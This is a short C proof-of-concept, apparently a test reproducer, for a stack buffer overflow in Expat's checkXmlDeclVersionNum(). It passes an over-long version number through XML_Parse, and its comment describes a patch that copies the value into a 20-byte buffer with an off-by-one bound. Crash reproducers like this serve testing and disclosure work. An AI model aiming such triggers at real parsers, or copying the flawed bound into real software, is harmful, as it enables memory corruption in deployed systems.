/* PoC: overflow in checkXmlDeclVersionNum() via an over-long but
   syntactically valid VersionNum ("1." followed by many digits) in the
   XML declaration.  Reaches the defect through the public XML_Parse API
   with in-contract input.

   On the parent revision the version value is accepted without being
   copied into a fixed-size buffer, so nothing overflows.  On the patched
   tree the new version check copies the value into a 20-byte stack buffer
   with an off-by-one bound, overflowing it for long version numbers. */
#include <stdio.h>
#include <string.h>
#include "expat.h"

int
main(void) {
  const char *doc = "<?xml version=\"1."
                    "0000000000000000000000000000000000000000\"?>\n"
                    "<doc/>";
  XML_Parser parser = XML_ParserCreate(NULL);
  if (parser == NULL) {
    fprintf(stderr, "could not create parser\n");
    return 2;
  }
  enum XML_Status status
      = XML_Parse(parser, doc, (int)strlen(doc), XML_TRUE);
  fprintf(stderr, "XML_Parse returned %d\n", (int)status);
  XML_ParserFree(parser);
  return 0;
}
